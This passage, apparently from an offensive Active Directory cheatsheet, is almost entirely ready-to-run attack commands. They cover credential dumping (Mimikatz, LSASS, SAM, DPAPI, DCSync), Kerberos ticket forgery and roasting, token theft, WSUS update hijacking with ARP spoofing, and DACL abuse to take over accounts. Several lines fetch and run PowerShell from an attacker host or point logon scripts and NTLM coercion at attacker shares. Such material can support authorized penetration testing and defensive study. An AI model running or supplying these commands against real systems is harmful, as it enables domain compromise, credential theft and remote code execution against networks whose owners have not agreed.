Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'

procdump.exe -accepteula -ma <lsass_PID> lsass.dmp

#Dump SAM and LSA
reg save HKLM\SAM "C:\Windows\Temp\sam.save"
reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"

Invoke-Mimikatz -Command '"lsadump::sam"'
Invoke-Mimikatz -Command '"lsadump::secrets"'

#Dump LSA in a PDF with LSA_reg2pdf
#Exec get_pdf, and get_bootkey on your host to parse the PDF
.\get_pdf.exe 1
python3.exe get_bootkey.py

#Dump credentials on multiple remote machines
Invoke-Mimikatz -DumpCreds -ComputerName @("Server01","Server02")

#Make a DCSync attack on all the users
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /all"'

#Retrieve NT hashes via Key List Attack on a RODC
    #First, forge a RODC Golden Ticket
.\Rubeus.exe golden /rodcNumber:<krbtgt_number> /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:<krbtgt_aes_key> /user:user1 /id:<user_RID> /domain:domain.local /sid:<domain_SID>
    #Then, request a ST and retrieve the NT hash in the TGS-REP
.\Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:ticket.kirbi /service:krbtgt/domain.local 

#Certsync - retrieve the NT hashes of all the users with PKINIT
#Backup the private key and the certificate of the Root CA, and forge Golden Certificates for all the users
#Authenticate with all the certificate via PKINIT to obtain the TGTs and extract the hashes with UnPAC-The-Hash
certsync -u administrator -p 'password' -d domain.local -dc-ip <DC_IP>
    #Provide the CA .pfx if it has been obtained with another way
certsync -u administrator -p 'password' -d domain.local -dc-ip <DC_IP> -ca-pfx CA.pfx
```

Many techniques to dump LSASS : [https://redteamrecipe.com/50-Methods-For-Dump-LSASS/](https://redteamrecipe.com/50-Methods-For-Dump-LSASS/)

#### Credentials Vault & DPAPI

Credential manager blobs are stored in `C:\Users\<user>\AppData\Local\Microsoft\Credentials`

List with Mimikatz:

```powershell
Invoke-Mimikatz -Command '"vault::list"'
```

To decrypt the creds, the DPAPI master encryption key must be retrieved. The key GUID can be retrieved with Mimikatz (the filed `guidMasterKey` is the one):

```powershell
Invoke-Mimikatz -Command '"dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<blob>"'
```

The GUID can be used to retrieve the key on the DC via a RPC call by providing the full path:

```powershell
Invoke-Mimikatz -Command '"dpapi::masterkey /in:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<user_SID>\<key_GUID> /rpc"'
```

Now it possible to decipher the creds with the key:

```powershell
Invoke-Mimikatz -Command '"dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<blob> /masterkey:<key>"'
```

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) is also a pretty good tool for DPAPI operations. Here in an elevated context to decrypt machine credential files and vaults:

```powershell
.\SharpDPAPI.exe machinecredentials
.\SharpDPAPI.exe machinevaults
```

Or here, to decrypt user's master keys with a domain backup key, and use them to decipher credential files:

```powershell
.\SharpDPAPI.exe masterkeys /pvk:key.pvk
.\SharpDPAPI.exe credentials {<masterkey_GUID>}:<masterkey_hash> {<masterkey2_GUID>}:<masterkey2_hash>
```

#### Lazagne

To retrieve maximum creds.

```batch
./lazagne.exe all
```

#### Credentials in third party softwares

Many applications present on a computer can store credentials, like KeePass, KeePassXC, mstsc and so on.

The more complete **ThievingFox** approach is presented in the Active Directory - Python edition cheatsheet.

```powershell
#KeePass with KeeThief
Import-Module KeeThief.ps1
Get-KeePassDatabaseKey -Verbose

#RDP creds with Mimikatz
#Client side
Invoke-Mimikatz -Command '"ts::mstsc"'
#Server side
Invoke-Mimikatz -Command '"ts::logonpasswords"'

#Credentials in Veeam database
./SharpVeeamDecryptor.exe
```

#### Force a NTLM authentication from a connected user

This attack weaponize DCOM objects to perform actions on behalf of an interactively connected user. Can be mixed with the NTLM downgrade or WebClient attacks to obtain NTLMv1 or HTTP authentication. Explains [here](https://www.ibm.com/think/x-force/remotemonologue-weaponizing-dcom-ntlm-authentication-coercions).

* Add _Interactive User_ to the AppID of the DCOM object with Remote Registry
* Start the WebClient service, or change the `HKLM\System\CurrentControlSet\Control\Lsa\LmCompatibilityLevel` registry key to allow NTLMv1

```powershell
#With ServerDataCollectorSet
$a = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("03837546-098B-11D8-9414-505054503030", "<target_IP>"))
$a.DataManager.Extract("\\<attacker_IP>\share\test.txt", "xforcered")

#With FileSystemImage
$a = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("2C941FC5-975B-59BE-A960-9A2A262853A5", "<target_IP>"))
$a.WorkingDirectory = "\\<attacker_IP>\share\test.txt"

#With UpdateSession, this one only trigger the machine account authentication
$a = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("4CB43D7F-7EEE-4906-8698-60DA1C38F2FE"))
$a.CreateUpdateServiceManager().AddScanPackageService("XFORCERED","\\<attacker_IP>\share\test.txt")
```

#### Bypass RunAsPPL

Check if RunAsPPL is enabled in the registry.

Look at `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`

```batch
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

If Mimikatz can't be used, [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller) is an alternative

```powershell
./PPLKiller.exe /installDriver
./PPLKiller.exe /disableLSAProtection
./PPLKiller.exe /uninstallDriver
```

And more recently, [PPLmedic](https://github.com/itm4n/PPLmedic)

```powershell
./PPLmedic.exe dump <lsass_PID> <C:\path\to\dump.dmp>
```

### Pass the Challenge

This technique permits to retrieve the NT hashes from a LSASS dump when Credential Guard is in place. This[ modified version of Pypykatz](https://github.com/ly4k/Pypykatz) must be used to parse the LDAP dump. Full explains [here](https://research.ifcr.dk/pass-the-challenge-defeating-windows-defender-credential-guard-31a892eee22).

#### NTLMv1

```powershell
#Dump the LSASS process with Mimikatz for example
#Parse the dump with Pypykatz
python3 -m pypykatz lsa minidump lsass.DMP -p msv

#Inject the SecurityPackage.dll into the LSASS process
./PassTheChallenge.exe inject ./SecurityPackage.dll

#Retrieve the NTLMv1 hash
./PassTheChallenge.exe nthash <context handle>:<proxy info> <encrypted blob>

#Crack the NTLMv1 hash on crack.sh to retrieve the NT hash
```

#### NTLMv2

In case where only NTLMv2 is allowed, it will not be possible to crack the NTLM hash, but it is possible to pass the challenge and provide the response. It is possible to perform this attack with this modified version of [Impacket](https://github.com/ly4k/Impacket). First, as above:

```powershell
#Dump the LSASS process with Mimikatz for example
#Parse the dump with Pypykatz
python3 -m pypykatz lsa minidump lsass.DMP -p msv

#Inject the SecurityPackage.dll into the LSASS process
./PassTheChallenge.exe inject ./SecurityPackage.dll
```

Then, authenticate with an Impacket tool specifying `CHALLENGE` as password, provide the printed challenge to `PassTheChallenge`, and send the computed response to Impacket:

```bash
#Authenticate with CHALLENGE as password
psexec.py 'domain.local/user1:CHALLENGE@target.domain.local'

#Copy paste the challenge to PassTheChallenge.exe and retrieve the response
./PassTheChallenge.exe challenge <context handle>:<proxy info> <encrypted blob> <challenge>

#Paste the response to the Impacket prompt (possible that multiple response are needed)
```

### Pass The Hash

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<nthash> /run:powershell.exe"'
```

### Over Pass The Hash / Pass The Key

Generate Kerberos TGT from hashes (or AES keys)

```powershell
#With Mimikat
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /rc4:<nthash> /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /aes256:<aes_key> /run:powershell.exe"'

#With Rubeus
.\Rubeus.exe asktgt /domain:domain.local /user:Administrator /rc4:<nthash> /ptt /opsec
.\Rubeus.exe asktgt /domain:domain.local /user:Administrator /aes256:<aes_key> /ptt /opsec
```

#### Bypass Kerberos Double Hop

By default, Kerberos **doesn't** permise to run a PSSession into a PSSession (or Invoke-Command into a PSSession, or whatever)

This can be bypassed with Mimikatz, by running a reverse shell in a **Over-Pass-the-Hash** from a PSSession

```powershell
$Contents = "powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<attacker_IP>/Invoke-HelloWorld.ps1'))"
Out-File -Encoding Ascii -InputObject $Contents -FilePath ./reverse.bat
Invoke-Mimikatz -Command '"sekurlsa::pth /user:user1 /domain:domain.local /ntlm:<nthash> /run:.\reverse.bat"'
```

In the new shell it is **not** possible to run an **Enter-PSSession**, but it is possible to create a **New-PSSession** and run **Invoke-Command** into this new session

```powershell
$sess = New-PSSession <target>
Invoke-Command -ScriptBlock{whoami;hostname} -Session $sess

Invoke-Command -ScriptBlock{mkdir /tmp; iwr http://<attacker_IP>/Invoke-HelloWorld.ps1 -o /tmp/Invoke-HelloWorld.ps1; . \tmp\Invoke-HelloWorld.ps1} -Session $sess
```

### Token manipulation

#### Standard token impersonation

* It is possible to use/impersonate tokens available on a machine
* We can use `Invoke-TokenManipulation` from PowerSploit or Incognito (Meterpreter) for token impersonation
* Administrative privileges are required to adjust token privileges
* List all tokens

```powershell
#List all tokens on the machine
Invoke-TokenManipulation -ShowAll

#List all unique, usable tokens on the machine
Invoke-TokenManipulation -Enumerate
```

* Start a new process with a specific token

```powershell
#Token of a user
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user1"

#Token of a process
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
```

#### Token impersonation with command execution and user addition

[Blog here](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/).

* List available tokens, and find an interesting token ID

```powershell
./Impersonate.exe list
```

* With only **SeImpersonatePrivilege**, if a privileged user's token is present on the machine, it is possible to run code on the domain as him and add a new user in the domain (and add him to the Domain Admins by default):

```powershell
./Impersonate.exe adduser <token_id> user1 Password123 <group_to_add_to> \\dc.domain.local
```

* With **SeImpersonatePrivilege and SeAssignPrimaryToken**, if a privileged user's token is presents on the machine, it is possible to execute comands on the machine as him:

```powershell
./Impersonate.exe exec <token_id> <command>
```

The same tool exists in Rust (not totally the same, the logic is a little bit different, looks at the [README](https://github.com/zblurx/impersonate-rs))

```powershell
#List all the process and their token
./irs.exe list

#Execute a command with the token from a process
./irs.exe exec --pid <PID> --command <command>
```

#### Token impersonation via session leaking

[Blog here](https://posts.specterops.io/koh-the-token-stealer-41ca07a40ed6). Basically, as long as a token is linked to a logon session (the **ReferenceCount != 0**), the logon session can't be closed, even if the user has logged off.\
`AcquireCredentialsHandle()` is used with a session LUID to increase the _ReferenceCount_ and block the session release. Then `InitializeSecurityContext()` and `AcceptSecurityContext()` are used to negotiate a new security context, and `QuerySecurityContextToken()` get an usable token.

* Server part

```powershell
#List logon session
Koh.exe list

#Monitor logon session with SID filtering
Koh.exe monitor <SID>

#Capture one token per SID found in new logon sessions
Koh.exe capture
```

* Client part (only available as Cobalt Strike BOF for the moment)

```powershell
#List captured tokens
koh list

#List group SIDs for a captured token
koh groups <LUID>

#Impersonate a captured token by specifying the session LUID
koh impersonate <LUID>

#Release all captured tokens
koh release all 
```

#### Tokens and ADCS

With administrative access to a (or multiple) computer, it is possible to retrieve the different process tokens, impersonate them and request CSRs and PEM certificate for the impersonated users.

```powershell
.\Masky.exe /ca:<CA_server_FQDN\CA_name> /template:<template_name> /output:./output.txt
```

### ADIDNS poisoning

How to deal with the **Active Directory Integrated DNS** and redirect the NTLM authentications to us

* By default, any user can create new ADIDNS records
* But it is not possible to change or delete a record we are not owning
* By default, the DNS will be used first for name resolution in the AD, and then NBT-NS, LLMNR, etc

If the **wilcard record** (\*) doesn't exist, we can create it and all the authentications will arrive on our listener, except if the WPAD configuration specifically blocks it.

#### Wildcard attack with Powermad

The char `*` can't be added via DNS protocol because it will break the request. Since we are in an AD we can modify the DNS via LDAP. This is what **Powermad** do:

```powershell
# get the value populated in the DNSRecord attribute of a node
Get-ADIDNSNodeAttribute -Node * -Attribute DNSRec

# creates a wildcard record, sets the DNSRecord and DNSTombstoned attributes
New-ADIDNSNode -Tombstone -Verbose -Node * -Data $IP

# enable a tombstoned record
Enable-ADIDNSNode -Node *

# disable a node
Disable-ADIDNSNode -Node *

# remove a node
Remove-ADIDNSNode -Node *

# check the wildcard record works/resolve a name
Resolve-DnsName NameThatDoesntExist
```

#### DNS update with Invoke-DNSUpdate

To work with "classic" record, i.e. not wildcard record

```powershell
Invoke-DNSUpdate -DNSType A -DNSName test.domain.local -DNSData <attacker_IP> -Realm domain.local
```

### Feature abuse

#### Jenkins

Go to `http://<IP>/script`

```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

Without admin access : add a build step in the build configuration, add `"Execute Windows Batch Command"` and `powershell –c <command>`

```bash
powershell -c "iex (new-object system.net.webclient).downloadstring('http://<attacker_IP>/Invoke-HelloWorld.ps1')"

#For more hardened policy
#On Kali
    echo "iex (new-object system.net.webclient).downloadstring('http://<attacker_IP>/Invoke-HelloWorld.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
#In Jenkins
    cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <base64_command>
```

#### SCCM / MECM - PXE boot

Check the dedicated [page](/books/cheatsheets-82c/page/system-center-configuration-manager).

#### WSUS

* Push an evil update on the computers : [SharpWSUS explains](https://labs.nettitude.com/blog/introducing-sharpwsus/)

```powershell
#Locate the WSUS server
./SharpWSUS locate

#Find a way to compromise it
#Enumerate the contents of the WSUS server to determine which machines to target
./SharpWSUS.exe inspect

#Create a malicious patch with a Microsoft signed binary (mandatory)
./SharpWSUS.exe create /payload:"C:\tmp\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user user1 Password123! /add && net localgroup administrators user1 /add\"" /title:"EvilWSUS"

#Create a WSUS group, add the target machine to the WSUS group and approve the malicious patch for deployment
./SharpWSUS.exe approve /updateid:<GUID_from_create> /computername:<target> /groupname:"Evil Group"

#Wait for the client to download the patch, not possible to control
./SharpWSUS.exe check /updateid:<GUID_from_create> /computername:<target>

#Clean up after the patch is downloaded.
./SharpWSUS.exe delete /updateid:<GUID_from_create> /computername:<target> /groupname:"Evil Group"
```

* [Spoof the WSUS server and hijack the update](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/wsus-spoofing) if the updates are pushed through HTTP and not HTTPS

```powershell
#Find the WSUS server with the REG key
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver

#Setup the fake WSUS server
python3.exe pywsus.py --host <network_interface> --port 8530 --executable ./PsExec64.exe --command '/accepteula /s cmd.exe /c "net user usser1 Password123! /add && net localgroup Administrators user1 /add"'
```

And ARP spoofing with bettercap and a `wsus_spoofing.cap` like this:

```go
# quick recon of the network
net.probe on

# set the ARP spoofing
set arp.spoof.targets $client_ip
set arp.spoof.internal false
set arp.spoof.fullduplex false

# reroute traffic aimed at the WSUS server
set any.proxy.iface $interface
set any.proxy.protocol TCP
set any.proxy.src_address $WSUS_server_ip
set any.proxy.src_port 8530
set any.proxy.dst_address $attacker_ip
set any.proxy.dst_port 8530

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff

# start the modules
any.proxy on
arp.spoof on
net.sniff on
```

```bash
bettercap --iface <network_interface> --caplet wsus_spoofing.cap
```

Now wait for update verification or manually trigger with a GUI access on the machine.

Another attack presented in the AD-CS cheatsheet permits to perform an ESC8 from a WSUS poisoning.

#### Pre-Windows 2000 Computers

Everything is explained [here](https://www.thehacker.recipes/ad/movement/domain-settings/pre-windows-2000-computers).

## Domain Privesc

### Kerberoast

#### Find users with SPN

```powershell
#PowerView
Get-NetUser -SPN

#ActiveDirectory module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

#### Request ST

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN/<target>.domain.local"
```

Or `Request-SPNTicket` with PowerView

#### Export the ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

#### Crack the ticket

Many options but this one works (also john, hashcat, etc...)

```batch
python.exe .\tgsrepcrack.py .\wordlist.txt .\ticket.kirbi
```

#### Rubeus

Rubeus can be used to perform all the attack, with more or less opsec

```powershell
#Kerberoast all the kerberoastable accounts
.\Rubeus.exe kerberoast

#Kerberoast a specified account
.\Rubeus.exe kerberoast /user:<target> /outfile:ticket.kirbi

#Kerberoast with RC4 downgrade even if the targets are AES enabled
#Tickets are easier to crack
.\Rubeus.exe kerberoast /tgtdeleg

#Kerberoast with opsec tgtdeleg trick filtering AES accounts
.\Rubeus.exe kerberoast /rc4opsec
```

### Kerberoast with DES

DES can be enabled in the following GPO `Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Network security` on the Domain Controller, on in the following registry key : `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\parameters\SupportedEncryptionTypes`. DES can be use to takeover any account except `krbtgt` and trust accounts. Full explains [here](https://exploit.ph/des-is-useful.html).

* Check if DES is enabled

```powershell
./Rubeus.exe asktgt /user:user1 /password:Password123 /domain:domain.local /dc:dc.domain.local /suppenctype:des /nowrap

#To check in the UAC of an account
Get-DomainUser user1 -Domain domain.local -Server dc.domain.local | select useraccountcontrol,serviceprincipalname
```

* Request a ST for the target SPN

```powershell
./Rubeus.exe asktgs /ticket:TGT.kirbi /service:<target_SPN> /enctype:des /dc:dc.domain.local /nowrap
```

* Perform a U2U request. The goal is to obtain a ticket for the user than can be decrypted to read the first block of plain text. This block will be used after to form a crackable hash. Retrieve the value of "Block One Plain Text" in the output

```powershell
./Rubeus.exe asktgs /u2u /ticket:TGT.kirbi /tgs:TGT.kirbi /nowrap
```

* Then, reuse this value in the `/desplaintext` parameter with the `describe` command

```powershell
./Rubeus.exe describe /desplaintext:<plain_text> /ticket:<previous_ST>
```

The `Kerberoast Hash` value in the output can be used with hashcat:

```bash
hashcat -a 3 -m 14000 <kerberoast_hash> -1 charsets/DES_full.charset --hex-charset ?1?1?1?1?1?1?1?1
```

The obtained DES key can now be used to ask for a TGT for the target account.

To exploit this against a Domain Controller, the DC account UAC must be changed from `SERVER_TRUST_ACCOUNT` (8192) needs to be changed to `WORKSTATION_TRUST_ACCOUNT` (4096) (Owner or Write access against the DC account are needed). **This attack can be destructive. It is not recommanded to perform it in production**. Additionally, DES must be activated in the UAC.

```powershell
Set-DomainObject "CN=DC,OU=Domain Controllers,DC=domain,DC=local" -XOR @{'useraccountcontrol'=12288}
Set-DomainObject "CN=DC,OU=Domain Controllers,DC=domain,DC=local" -XOR @{'useraccountcontrol'=2097152}
```

Then, the attack can be performed as presented above. To rollback to `SERVER_TRUST_ACCOUNT` an admin account is needed. First escalate to DA, then:

```powershell
Set-DomainObject "CN=DC,OU=Domain Controllers,DC=domain,DC=local" -XOR @{'useraccountcontrol'=12288}
```

### Kerberoast w/o creds

#### Without pre-authentication

If a principal can authent without pre-authentication (like AS-REP Roasting), it is possible to use it to launch an **AS-REQ request** (for a TGT) and trick the request to ask for a ST instead for a kerberoastable principal, by modifying the **sname** attribut in the **req-body** part of the request. Full explains [here](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

```powershell
.\Rubeus.exe kerberoast /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"user_w/o_preauth" /spn:users.txt
```

#### With MitM

If no principal without pre-authentication are present, it is still possible to intercept the **AS-REQ requests** on the wire (with ARP spoofing for example), and replay them to kerberoast.

**WARNING : `RoastInTheMiddle.exe` is only a PoC for the moment, be carefull with it in prod environment !**

```powershell
./RoastInTheMiddle.exe /listenip:<attacker_IP> /spns:users.txt /targets:<target_IP_1>,<target_IP_2> /dcs:<DC_IP_1>,<DC_IP_2>
```

#### Combined with DES

Here are the steps to follow to perform the attack, as described by [Charlie Clark](https://twitter.com/exploitph).

1. Request a valid TGT for User1.
2. Send U2U with User1’s TGT as both authentication and additional tickets to extract known plain text of first block.
3. Man-in-the-Middle (MitM) is performed.
4. AS-REQ for Computer1 is captured.
5. AS-REQ modified to only include the DES-CBC-MD5 etype.
6. Forward AS-REQ to a DC that supports DES.
7. Extract TGT for Computer1 from AS-REP.
8. Send U2U with User1’s TGT as the authentication ticket and Computer1’s TGT as the additional ticket to get an ST encrypted with Computer1’s TGT’s session key.
9. Create a DES hash from U2U ST encrypted with Computer1’s TGT’s session key.
10. Create KERB\_CRED from Computer1’s TGT and known information, missing the session key.
11. Crack the DES hash back to the TGT session key.
12. Insert the TGT session key into the KERB\_CRED.
13. Use the TGT to authenticate as Computer1.

**For the moment, this version of RoastIntheMiddle doesn't seem available.**

```powershell
./RoastInTheMiddle.exe sessionroast /listenip:<attacker_IP> /targets:<target_IP_1>,<target_IP_2> /dcs:<DC_IP_1>,<DC_IP_2> /tgt:<TGT_of_known_user>
```

The "Hash DES session key" can be cracked with hashcat:

```bash
hashcat -a 3 -m 14000 <DES_hash> -1 charsets/DES_full.charset --hex-charset ?1?1?1?1?1?1?1?1
```

And the crack result (which is the DES session key) with the "Kirbi missing session key" can be combined to build a valid TGT:

```powershell
./Rubeus.exe kirbi /sessionkey:<cracked_session_key> /sessionetype:des /kirbi:<kirbi_w/o_session_key> /nowrap
```

### AS-REP Roasting

#### Enumerate users

```powershell
#UPowerView:
Get-DomainUser -PreauthNotRequired -Verbose

#AD module:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

#### Request AS-REP hash

```powershell
.\Rubeus.exe asreproast /user:<target> /domain:domain.local /format:hashcat

#To enumerate AS-REP roastable users through LDAP
.\Rubeus.exe asreproast /creduser:"domain.local\user1" /credpassword:"password" /domain:domain.local /format:hashcat
```

It is possible to force DES, if it is allowed:

```powershell
.\Rubeus.exe asreproast /user:<target> /domain:domain.local /des /format:hashcat
```

#### Disable Kerberos Preauth

With PowerView, with enough privileges it is possible to perform targeted AS-REP roasting.

```powershell
Set-DomainObject -Identity user1 -XOR @{useraccountcontrol=4194304} -Verbose
Get-DomainUser -PreauthNotRequired -Verbose
```

#### Crack the hash

With **john** or **hashcat** it could be performed.

In case of DES hash, here is the command:

```bash
hashcat -a 3 -m 14000 <DES_hash> -1 charsets/DES_full.charset --hex-charset ?1?1?1?1?1?1?1?1
```

### Hijacking GPP Name-Only

#### sAMAccountName hijacking

The theory behind this attack is explained in [this article.](https://www.cogiceo.com/en/whitepaper_gpphijacking/)

1. Initial configuration:&#x20;
   1. A user `priv_usr` has `GenericWrite` rights over another user `low_priv`.
   2. A GPP is configured to add a "Name-Only" member named `nonexistentuser` to the local `Administrators` group.
2. First GPO application:
   1. The system try to resolve `nonexistentuser`, but fails (the user doesn't exist).
   2. No member is added to `Administrators`.
3. `sAMAccountName` modification:
   1. The attacker uses their `GenericWrite` rights to change the `sAMAccountName` from `low_priv` to `nonexistentuser`.

```bash
bloodyAD --host <DC_IP> -u "priv_usr" -p password set object "CN=low_priv,CN=Users,DC=domain,DC=local" sAMAccountName -v "nonexistentuser"
```

4. GPO replication:
   1. The next time the GPO is applied (or via a manual command such as `gpupdate /force`), the system resolves `nonexistentuser` to the SID of `low_priv.`
   2. Result: `low_priv` is added to the `Administrators` group.

#### UPN hijacking

1. Initial configuration:&#x20;
   1. A GPP is configured to add a "Name-Only" member in UPN format: `existingusr@domain.local`.
   2. A user named `existingusr` already exists in the domain with this UPN.
2. `sAMAccountName` modification:
   1. The attacker changes the `sAMAccountName` of `low_priv` to match the UPN exactly: `existingusr@domain.local`(this format is permitted for a UPN).

```bash
bloodyAD --host <DC_IP> -u "priv_usr" -p password set object "CN=low_priv,CN=Users,DC=domain,DC=local" sAMAccountName -v "existingusr@domain.local"
```

3. GPO replication:
   1. During resolution, **`LsaLookupNames` first searches for an exact match in the `sAMAccountName` field, before the UPN**.
   2. Result: `low_priv` is added to the `Administrators` group instead of `existingusr`.

#### GPP processus variables

1. A GPP is linked to an OU containing the WS computer and adds `%DomainName%\%ComputerName%_adm` (i.e. `DOMAIN\WS_adm`) to the `Administrators` group.
2. The attacker checks that `WS_adm` does not exist:

```bash
bloodyAD --host <DC_IP> -u "priv_usr" -p password get object "WS_adm"
```

3. The attacker changes the `sAMAccountName` of `low_priv` to match `WS_adm`:

```bash
bloodyAD --host <DC_IP> -u "priv_usr" -p password set object "CN=low_priv,CN=Users,DC=domain,DC=local" sAMAccountName -v "WS_adm"
```

4. Result: The next time GPP is applied, `low_priv` is added to the `Administrators` group on the WS machine.

### DACLs attacks

#### DACLs packages

* **Owns object**
  * WriteDacl
* **GenericAll**
  * GenericWrite
  * AllExtendedRights
  * WriteOwner
* **GenericWrite**
  * Self
  * WriteProperty
* **AllExtendedRights**
  * User-Force-Change-Password
  * DS-Replication-Get-Changes
  * DS-Replication-Get-Changes-All
  * DS-Replication-Get-Changes-In-Filtered-Set

#### On any objects

##### WriteOwner
With this rights on a user it is possible to become the "owner" (**Grant Ownership**) of the account and then change our ACLs against it

```powershell
Set-DomainObjectOwner -Identity <target> -OwnerIdentity user1 -verbose
Add-ObjectAcl -TargetIdentity <target> -PrincipalIdentity user1 -Rights ResetPassword

#And change the password
$cred = ConvertTo-SecureString "Password123!" -AsPlainText -force                  
Set-DomainUserPassword -Identity <target> -accountpassword $cred
```

##### WriteDacl
With this rights we can modify our ACLs against the target, and give us **GenericAll** for example

```powershell
Add-ObjectAcl -TargetIdentity <target> -PrincipalIdentity user1 -Rights All
```

In case where you have the right against a container or an OU, it is possible to setup the **Inheritance** flag in the ACE. The child objects will inherite the parent container/OU ACE (except if the object has `AdminCount=1`)

```powershell
$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity user1 -Right ExtendedRight,ReadProperty,GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
$OU = Get-DomainOU -Raw <OU_name>

$dsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
```

#### On an user

##### WriteProperty
* ShadowCredentials

```powershell
Whisker.exe add /target:<target> /domain:domain.local /dc:dc.domain.local /path:C:\path\to\file.pfx /password:"Password123!"
```

* Logon Script

```powershell
#PowerView
Set-DomainObject <target> -Set @{'mstsinitialprogram'='\\ATTACKER_IP\rev.exe'} -Verbose

#AD module
Set-ADObject -SamAccountName '<target>' -PropertyName scriptpath -PropertyValue "\\ATTACKER_IP\rev.exe"
```

* Targeted Kerberoasting

We can then request a ST without special privileges. The ST can then be "**Kerberoasted**".

```powershell
#Verify if the user already has a SPN
Get-DomainUser -Identity <target> | select serviceprincipalname
    #Using ActiveDirectory module
Get-ADUser -Identity <target> -Properties ServicePrincipalName | select ServicePrincipalName
```

**New SPN must be unique in the domain**

```powershell
#Set the SPN
Set-DomainObject -Identity user -Set @{serviceprincipalname='ops/whatever1'}
    #Using ActiveDirectory module
Set-ADUser -Identity user -ServicePrincipalNames @{Add='ops/whatever1'} 

#Request the ticket
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
    #From PowerView
Request-SPNTicket
```

##### User-Force-Change-Password
With enough permissions on a user, we can change his password

```powershell
net user <target> Password123! /domain

#With PowerView
$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("domain\user1", $pass)
Set-DomainUserPassword "<target>" -AccountPassword $UserPassword -Credential $cred
```

#### On a computer

##### WriteProperty
* ShadowCredentials

```powershell
Whisker.exe add /target:<target> /domain:domain.local /dc:dc.domain.local /path:C:\path\to\file.pfx /password:Password123!
```

* Kerberos RBCD

##### AllExtendedRights
* ReadLAPSPassword

```powershell
# With PowerView
Get-DomainComputer <target>.domain.local -Properties ms-mcs-AdmPwd,displayname,ms-mcs-AdmPwdExpirationTime
```

* ReadGMSAPassword

```powershell
./GMSAPasswordReader.exe --accountname gmsaAccount
```
#### On a RODC

##### GenericWrite
* Obtain local admin access

Change the `managedBy` attribute value and add a controlled user. He will automatically gain admin rights.

* Retrieve Tiers 0 account's NT hashes

It is possible to modify the `msDS-NeverRevealGroup` and `msDS-RevealOnDemandGroup` lists on the RODC to allow Tiers 0 accounts to authenticate, and then forge RODC Golden Tickets for them to access other parts of the AD.

```powershell
#Add a domain admin account to the msDS-RevealOnDemandGroup attribute
Set-DomainObject -Identity RODC-Server$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}

#If needed, remove the admin from the msDS-NeverRevealGroup attribute
Set-DomainObject -Identity RODC-Server$ -Clear 'msDS-NeverRevealGroup'
```

##### WriteProperty
**WriteProperty** on the `msDS-NeverRevealGroup` and `msDS-RevealOnDemandGroup` lists is sufficient to modify them. Obtain the `krbtgt_XXXXX` key is still needed to forge RODC Golden Ticket.

```powershell
#Add a domain admin account to the msDS-RevealOnDemandGroup attribute
Set-DomainObject -Identity RODC-Server$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}

